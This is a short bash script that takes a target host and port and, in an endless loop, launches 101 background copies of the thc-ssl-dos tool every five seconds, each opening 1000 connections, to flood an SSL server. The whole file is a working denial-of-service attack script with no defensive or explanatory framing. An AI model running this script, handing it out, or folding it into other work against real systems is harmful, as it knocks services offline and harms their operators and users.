#!/bin/bash

if [[ $# -lt 2 ]]; then
	echo Specify host and port as arguments
	exit 1
fi

HOST=$1
PORT=$2

while true; do
        for ((i=0; i <= 100; i++)); do
                src/thc-ssl-dos --accept $HOST $PORT -l 1000 &
        done;
        sleep 5;
done
